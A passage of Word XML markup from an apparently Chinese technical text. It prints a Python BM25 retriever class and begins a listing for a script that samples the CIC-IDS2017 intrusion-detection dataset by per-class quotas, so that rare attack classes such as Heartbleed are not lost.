    <w:p w14:paraId="4C24B301">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    def __init__(self, chunks_path: str, k1: float = 1.5, b: float = 0.75):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="211B4808">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        path = Path(chunks_path)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02B8C673">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        if not path.exists():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75A12081">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            raise SystemExit(f"找不到知识库 {path}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E508AC1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.chunks = json.loads(path.read_text(encoding="utf-8"))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="700C6420">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.k1, self.b = k1, b</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C4A1F93">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.docs = [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3524D61A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            tokenize(c["title"] + " " + " ".join(c.get("tags", [])) + " " + c["text"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="215CFE6C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            for c in self.chunks</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70CD16AA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        ]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="198D1BE8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.freqs = [Counter(d) for d in self.docs]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BCB9E37">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.lengths = [len(d) for d in self.docs]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E1E182D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.avg_len = sum(self.lengths) / max(len(self.lengths), 1)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56417E6E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.n = len(self.chunks)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BD02ADD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        df = Counter()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="063983F4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        for f in self.freqs:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11DC32F9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            df.update(set(f))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35B24C66">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        # 加 1 平滑：某个词在全部文档里都出现时 idf 也不会变成负的</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39DDABBF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.idf = {t: math.log(1 + (self.n - c + 0.5) / (c + 0.5)) for t, c in df.items()}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E0C547B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6F192EDC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    def score(self, query_tokens, i) -&gt; float:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DADF82E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        f, L = self.freqs[i], self.lengths[i]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05577CB7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        s = 0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63D110B3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        for t in query_tokens:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AE96C7A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            if t not in f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1337B3D7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                continue</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A042AF5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            idf = self.idf.get(t, 0.0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FE8E266">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            s += idf * f[t] * (self.k1 + 1) / (</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2282C74A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                f[t] + self.k1 * (1 - self.b + self.b * L / max(self.avg_len, 1e-9))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C31E719">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C4BA2D4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return s</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57B62BD4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3B587AE0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    def retrieve(self, query: str, top_k: int = 3) -&gt; list:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49FEA8B6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        qt = tokenize(query)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="747C9D97">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        if not qt:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A943469">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            return []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1013E410">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        scored = [(self.score(qt, i), i) for i in range(self.n)]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7524FC3D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        scored.sort(key=lambda x: -x[0])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00F0FB43">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        out = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FC913EE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        for s, i in scored[:top_k]:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19B18D57">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            if s &lt;= 0:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3ED59BA6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                continue</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E97B56E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            out.append({**self.chunks[i], "score": round(s, 4)})</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62FC4B16">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return out</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32FAA563">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="228B2EC1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    def categories(self) -&gt; list:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50AD93AA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return sorted({t for c in self.chunks for t in c.get("tags", [])})</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57821FF1">
      <w:pPr>
        <w:spacing w:before="0" w:after="160"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="154F8328">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="160" w:after="40"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>代码 3-24　tools/build_sample.py</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>（223 行）　数据集抽样与清洗</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44BD6FDC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>"""从 CIC-IDS2017 官方 8 个 MachineLearningCVE CSV 抽出一份可训练的小样本。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31AE4D2B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2B5B7FFE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>为什么要按类配额抽，而不是按比例抽：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="474A48D0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>全量 2,830,743 行里 BENIGN 占 80.3%，Heartbleed 只有 11 行。如果按同一个比例抽到 25 万行</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3546147B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>（约 8.8%），Heartbleed 只会剩 1 行，7:2:1 划分后测试集 0 行——这个类等于被抹掉了。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3492C8BC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>所以按"每类配额"抽：常见类截断，稀有类全收。代价是训练集的类别先验被抬高，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2920BEDB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>报告里必须写明这一点，不能拿这个样本上的准确率当线上准确率。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DE764F2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6EE89B84">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
